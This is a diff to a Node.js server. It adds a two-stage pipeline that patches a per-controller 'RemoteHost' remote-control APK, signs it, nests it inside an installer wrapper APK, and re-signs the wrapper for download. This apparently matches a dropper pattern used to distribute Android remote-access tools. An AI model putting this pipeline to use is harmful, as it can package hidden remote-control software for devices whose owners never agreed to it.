@@ -13,8 +13,9 @@ const { Redis } = require('@upstash/redis');
 // ═══════════════════════════════════════════════════════════════════════
 //  APK BUILDER  —  per-controller signed APK generation
 // ═══════════════════════════════════════════════════════════════════════
-const TEMPLATE_APK = path.join(__dirname, 'template.apk');
-const APK_SIGNER_JAR = path.join(__dirname, 'uber-apk-signer.jar');
+const TEMPLATE_APK           = path.join(__dirname, 'template.apk');            // inner RemoteHost APK
+const TEMPLATE_INSTALLER_APK = path.join(__dirname, 'template-installer.apk'); // installer wrapper APK
+const APK_SIGNER_JAR         = path.join(__dirname, 'uber-apk-signer.jar');
 const BUILD_DIR = path.join(os.tmpdir(), 'apk-builds');
 const PLACEHOLDER_KEY = 'CMD-00000000';
 const PLACEHOLDER_URL = 'wss://placeholder.invalid';
@@ -166,6 +167,59 @@ function signApk(inputApk, outDir) {
   });
 }
 
+// ── 2b. Replace the inner APK inside the installer wrapper ───────────
+// Auto-detects the inner APK slot inside assets/ so it survives renames.
+function wrapInstaller(installerPath, innerApkPath, outPath) {
+  return new Promise((resolve, reject) => {
+    try {
+      if (!fs.existsSync(installerPath)) {
+        return reject(new Error(`Installer template missing: ${installerPath}`));
+      }
+
+      const zip = new AdmZip(installerPath);
+      const allEntries = zip.getEntries();
+
+      // Find any .apk file inside assets/ (case-insensitive)
+      const innerEntry = allEntries.find(e => {
+        const n = e.entryName.toLowerCase();
+        return n.startsWith('assets/') && n.endsWith('.apk');
+      });
+
+      if (!innerEntry) {
+        const assetEntries = allEntries
+          .map(e => e.entryName)
+          .filter(n => n.startsWith('assets/'))
+          .slice(0, 30);
+        return reject(new Error(
+          `No APK found inside installer's assets/ folder. ` +
+          `Expected assets/<something>.apk. Found: ${assetEntries.join(', ') || '(empty)'}`
+        ));
+      }
+
+      console.log(`🔍 installer inner slot: ${innerEntry.entryName}`);
+      const innerBytes = fs.readFileSync(innerApkPath);
+      zip.updateFile(innerEntry, innerBytes);
+      zip.writeZip(outPath);
+
+      const sz = fs.statSync(outPath).size;
+      console.log(`🎁 installer wrapped → ${(sz / 1024 / 1024).toFixed(1)} MB  (inner ${(innerBytes.length / 1024 / 1024).toFixed(1)} MB)`);
+      resolve();
+    } catch (e) {
+      reject(e);
+    }
+  });
+}
+
+// Helper — find the freshly signed APK in an output directory
+function findSignedApk(dir) {
+  let entries = [];
+  try { entries = fs.readdirSync(dir); } catch (_) {}
+  const signed = entries.find(f => f.endsWith('-signed.apk'));
+  if (signed) return path.join(dir, signed);
+  const anyApk = entries.find(f => f.endsWith('.apk'));
+  return anyApk ? path.join(dir, anyApk) : null;
+}
+
 // ── 3. Full build pipeline (patch → sign → cache) ────────────────────
 async function buildApkForMaster(masterId) {
   // Fast path — cached and still fresh
@@ -188,43 +242,47 @@ async function actuallyBuild(masterId) {
   }
 
   const buildId = crypto.randomBytes(6).toString('hex');
-  const patchedPath = path.join(BUILD_DIR, `patched-${buildId}.apk`);
-  const signOutDir = path.join(BUILD_DIR, `signed-${buildId}`);
-  fs.mkdirSync(signOutDir, { recursive: true });
+  const workDir = path.join(BUILD_DIR, buildId);
+  fs.mkdirSync(workDir, { recursive: true });
+
+  const patchedInner     = path.join(workDir, 'patched-inner.apk');
+  const innerSignDir     = path.join(workDir, 'inner-signed');
+  const wrappedInstaller = path.join(workDir, 'wrapped-installer.apk');
+  const finalSignDir     = path.join(workDir, 'final-signed');
+  fs.mkdirSync(innerSignDir, { recursive: true });
+  fs.mkdirSync(finalSignDir, { recursive: true });
 
   try {
-    // 1. Patch
-    await patchApk(TEMPLATE_APK, patchedPath, masterId);
+    // ── Stage 1: patch + sign the inner RemoteHost APK ─────────────
+    console.log(`🔧 [${masterId}] stage 1/2 — patching inner APK`);
+    await patchApk(TEMPLATE_APK, patchedInner, masterId);
 
-    // 2. Sign
-    await signApk(patchedPath, signOutDir);
+    console.log(`🔧 [${masterId}] stage 1/2 — signing inner APK`);
+    await signApk(patchedInner, innerSignDir);
+    const signedInner = findSignedApk(innerSignDir);
+    if (!signedInner) throw new Error('stage 1: signer produced no inner APK');
+    const innerSize = fs.statSync(signedInner).size;
+    console.log(`✅ [${masterId}] inner signed: ${(innerSize / 1024 / 1024).toFixed(1)} MB`);
 
-    // 3. Find the signed output
-    const searchDirs = [signOutDir, BUILD_DIR];
-    let signedPath = null;
-    const patchedBase = path.basename(patchedPath);
+    // ── Stage 2: wrap the installer + sign it ──────────────────────
+    console.log(`🔧 [${masterId}] stage 2/2 — wrapping installer`);
+    await wrapInstaller(TEMPLATE_INSTALLER_APK, signedInner, wrappedInstaller);
 
-    for (const d of searchDirs) {
-      let entries = [];
-      try { entries = fs.readdirSync(d); } catch (_) {}
-      const signedMatch = entries.find(f => f.endsWith('-signed.apk') && f !== patchedBase);
-      if (signedMatch) { signedPath = path.join(d, signedMatch); break; }
-      const anyApk = entries.find(f => f.endsWith('.apk') && f !== patchedBase);
-      if (anyApk) { signedPath = path.join(d, anyApk); break; }
-    }
+    console.log(`🔧 [${masterId}] stage 2/2 — signing installer`);
+    await signApk(wrappedInstaller, finalSignDir);
+    const finalApk = findSignedApk(finalSignDir);
+    if (!finalApk) throw new Error('stage 2: signer produced no final APK');
 
-    if (!signedPath) {
-      throw new Error('Signer produced no .apk output');
-    }
+    const size = fs.statSync(finalApk).size;
+    console.log(`✅ [${masterId}] FINAL installer: ${(size / 1024 / 1024).toFixed(1)} MB`);
 
-    const size = fs.statSync(signedPath).size;
-    console.log(`✅ signed APK: ${signedPath} (${(size / 1024 / 1024).toFixed(1)} MB)`);
-
-    const rec = { path: signedPath, size, builtAt: Date.now() };
+    const rec = { path: finalApk, size, builtAt: Date.now() };
     apkCache.set(masterId, rec);
     return rec;
-  } finally {
-    try { fs.unlinkSync(patchedPath); } catch (_) {}
+  } catch (e) {
+    // Clean up intermediate files on failure
+    try { fs.rmSync(workDir, { recursive: true, force: true }); } catch (_) {}
+    throw e;
   }
 }
 
@@ -452,7 +510,7 @@ const server = http.createServer((req, res) => {
     }
   }
 
-    // ── Serve admin-remote.html ───────────────────────────────────────
+  // ── Serve admin-remote.html ───────────────────────────────────────
   if (req.method === 'GET' && (req.url === '/admin-remote' || req.url.startsWith('/admin-remote?'))) {
     try {
       const html = fs.readFileSync(path.join(__dirname, 'admin-remote.html'), 'utf8');
